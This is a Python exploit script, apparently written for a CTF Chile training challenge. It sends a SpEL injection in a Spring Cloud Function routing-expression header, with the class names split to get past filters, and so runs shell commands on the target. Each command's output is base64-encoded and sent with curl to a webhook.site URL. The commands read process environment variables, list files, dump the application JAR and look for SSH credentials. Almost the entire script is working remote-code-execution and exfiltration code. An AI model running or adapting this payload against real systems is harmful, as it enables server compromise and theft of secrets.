#!/usr/bin/env python3
"""
CTF Chile - Investigar archivo out.txt y otros archivos relevantes
"""
import requests
import time
import base64

TARGET = "http://training-pod2.ctfchile.com:32778"
ROUTER = TARGET + "/functionRouter"

# Crear webhook
print("[*] Creando webhook...")
UUID = requests.post("https://webhook.site/token", timeout=10).json()["uuid"]
WH = "https://webhook.site/" + UUID
print(f"    URL: {WH}")

def build_payload(shell_cmd):
    esc = shell_cmd.replace("\\", "\\\\").replace('"', '\\"')
    return (
        'T(java.lang.Class).forName("java.lang.Runt"+"ime")'
        '.getMethod("exe"+"c",new String[]{}.getClass())'
        '.invoke('
        'T(java.lang.Class).forName("java.lang.Runt"+"ime")'
        '.getMethod("getRunt"+"ime").invoke(null),'
        'new String[]{"/bin/sh","-c","' + esc + '"}'
        ').waitFor()'
    )

def probe(tag, cmd):
    shell = f"{cmd} | base64 -w0 | xargs -I X curl -s '{WH}/{tag}?d=X'"
    p = build_payload(shell)
    try:
        r = requests.post(ROUTER, headers={
            "spring.cloud.function.routing-expression": p,
            "Content-Type": "text/plain",
        }, data="x", timeout=15)
        print(f"    [+] {tag:25} http {r.status_code}")
    except Exception as e:
        print(f"    [!] {tag} error: {e}")

print("[*] Investigando archivo out.txt...")

# Examinar el archivo out.txt
probe("out_txt_content", "cat /tmp/out.txt")
probe("out_txt_info", "ls -la /tmp/out.txt")
probe("out_txt_file", "file /tmp/out.txt")

print("[*] Buscando otros archivos relevantes en /tmp...")

# Listar todos los archivos en /tmp con detalles
probe("tmp_detailed", "find /tmp -type f -ls")
probe("tmp_recent", "find /tmp -type f -mtime -1 -exec ls -la {} \\;")

print("[*] Examinar proceso Java y sus outputs...")

# Verificar proceso Java y archivos abiertos
probe("java_process", "ps aux | grep java")
probe("java_fds", "ls -la /proc/1/fd/")

print("[*] Buscar archivos de log específicos...")

# Buscar logs que puedan contener información
probe("app_logs_tmp", "find /tmp -name '*log*' -o -name '*out*' -o -name '*err*' | head -10")
probe("spring_logs", "find /app /tmp -name 'spring*' -o -name 'application*' 2>/dev/null")

print("[*] Examinar contenido del directorio de trabajo...")

# Listar contenido del directorio actual
probe("pwd_content", "pwd && ls -la")
probe("working_dir", "ls -la /app/")

print("[*] Verificar si hay archivos de configuración recién creados...")

# Buscar archivos muy recientes
probe("very_recent", "find /app /tmp /root -type f -newermt '10 minutes ago' 2>/dev/null | head -15")

print("[*] Buscar información en variables de entorno del proceso...")

# Examinar variables de entorno del proceso Java
probe("java_env", "cat /proc/1/environ | tr '\\0' '\\n' | sort")

print("[*] Intentar leer archivos de configuración de Spring Boot directamente...")

# Forzar lectura de archivos embebidos
probe("jar_list", "unzip -l /app/app.jar | head -20")
probe("jar_manifest", "unzip -p /app/app.jar META-INF/MANIFEST.MF")

time.sleep(12)

# Recoger respuestas
print("[*] Recogiendo respuestas...")
r = requests.get(f"https://webhook.site/token/{UUID}/requests?sorting=newest&per_page=25", timeout=10)
data = r.json().get("data", [])

for req in data:
    url = req.get("url", "")
    path = url.split(f"webhook.site/{UUID}/")[-1].split("?")[0]
    q = req.get("query") or {}
    raw = q.get("d")
    if isinstance(raw, list):
        raw = raw[0] if raw else ""

    print("=" * 60)
    print("TAG:", path)
    if raw:
        try:
            decoded = base64.b64decode(raw).decode("utf-8", "replace")
            print(decoded)

            # Buscar flags y información útil
            if "ctfchile{" in decoded.lower():
                print("\n🚩🚩🚩 FLAG ENCONTRADO! 🚩🚩🚩")
                print("CONTENIDO DEL FLAG:", decoded)

            # Buscar credenciales SSH o información de hosts
            if any(keyword in decoded.lower() for keyword in ["ssh", "password", "key", "10.160.209.1"]):
                print("🔑 INFORMACIÓN RELEVANTE PARA SSH")

        except Exception as e:
            print(f"(decode error) {raw[:200]}")
    else:
        print("(sin payload)")

print(f"\n[*] Manual review: https://webhook.site/#!/{UUID}")